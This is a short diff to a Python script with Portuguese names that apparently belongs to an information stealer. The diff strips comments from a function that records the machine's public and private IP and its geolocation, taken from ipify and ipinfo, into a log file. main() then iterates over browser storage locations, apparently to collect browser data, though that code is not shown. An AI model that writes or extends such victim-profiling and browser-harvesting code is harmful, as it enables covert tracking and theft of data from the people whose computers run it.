@@ -229,13 +229,10 @@ def file_handler(file):
 
 def capturar_geolocalizacao():
     try:
-        # Obter o IP público
         ip_publico = requests.get('https://api.ipify.org').text
 
-        # Obter o IP privado
         ip_privado = socket.gethostbyname(socket.gethostname())
 
-        # Obter geolocalização a partir do IP público
         resposta_geo = requests.get(f'https://ipinfo.io/{ip_publico}/json')
         if resposta_geo.status_code == 200:
             dados_geo = resposta_geo.json()
@@ -244,7 +241,7 @@ def capturar_geolocalizacao():
             pais = dados_geo.get('country', 'Não disponível')
             loc = dados_geo.get('loc', 'Não disponível')  # Latitude e Longitude
 
-            # Escrever as informações no arquivo
+
             with open(fileInfo, "a") as f:
                 f.write(f"IP Público {ip_publico}\n")
                 f.write(f"IP Privado {ip_privado}\n")
@@ -260,7 +257,6 @@ def capturar_geolocalizacao():
             f.write(f"\nErro ao obter informações de geolocalização\n{str(e)}\n")
 
 def main():
-    # Capturar geolocalização antes de coletar outras informações
     capturar_geolocalizacao()
     
     for nome, path in browser_loc.items():
